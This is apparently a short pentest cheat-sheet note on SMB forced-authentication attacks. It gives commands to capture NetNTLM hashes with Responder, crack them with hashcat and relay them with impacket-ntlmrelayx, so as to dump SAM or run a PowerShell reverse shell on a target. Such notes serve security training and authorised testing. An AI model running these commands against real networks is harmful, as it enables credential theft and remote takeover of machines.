[[SMB (139, 445)]]

### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

```shell-session
responder -I <interface name>
```
Crack captured creds with [[Creds#Hashcat]]
creds are saved at `/usr/share/responder/logs/`
```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
 If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='
```
[[Pre-Engagement/Tools/Impacket|Impacket]]
Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <powershellreverse shell>
```
[Revshell][https://www.revshells.com/]
